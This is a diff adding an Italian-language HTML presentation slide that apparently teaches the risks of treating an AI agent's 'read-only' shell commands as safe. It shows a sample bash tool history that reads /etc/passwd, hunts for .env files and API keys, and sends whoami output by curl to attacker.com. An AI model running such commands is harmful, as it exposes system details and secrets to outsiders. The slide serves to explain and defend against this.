@@ -1,0 +1,24 @@
+<section>
+  <h2 class="section-title">Analisi Comandi - ReadOnly?</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card">
+        <div class="card-header">$ bash_tool history</div>
+        <pre><code class="language-bash">$ ls -la /etc/passwd
+$ cat /etc/hostname
+$ curl https://attacker.com/exfil?data=$(whoami)
+$ find / -name "*.env" -type f
+$ grep -r "API_KEY" /app/</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="textbox">
+        <p><strong>Tutti comandi "readonly"</strong> — nessuno modifica il filesystem.</p>
+        <p>Ma permettono:</p>
+        <p class="fragment"><span class="inline-tag tag-red">Recon</span> Enumerazione del sistema</p>
+        <p class="fragment"><span class="inline-tag tag-red">Exfil</span> Esfiltrazione dati via curl</p>
+        <p class="fragment"><span class="inline-tag tag-red">Secrets</span> Ricerca di credenziali e API key</p>
+      </div>
+    </div>
+  </div>
+</section>
